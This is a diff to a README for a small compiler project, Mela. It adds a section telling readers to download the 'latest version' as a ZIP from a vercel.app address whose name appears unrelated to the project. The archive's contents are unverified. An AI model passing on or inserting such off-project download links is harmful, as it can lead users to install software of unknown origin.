@@ -52,6 +52,13 @@ ld compiler.o -o mela_compiler
 ```
 The output will be an assembly (.asm) file. You can convert this file to machine code with a suitable assembler.
 
+## Download and Installation
+You can always download the latest version of Mela from the following link:
+
+[Download Mela (ZIP)](https://antolojiyaislame.vercel.app/mela-latest.zip)
+
+Extract the archive and follow the instructions below for your operating system.
+
 ## Using the Build Script (Windows/WSL)
 If you are on Windows, you can use the provided script to build and run the lexer easily:
 ```
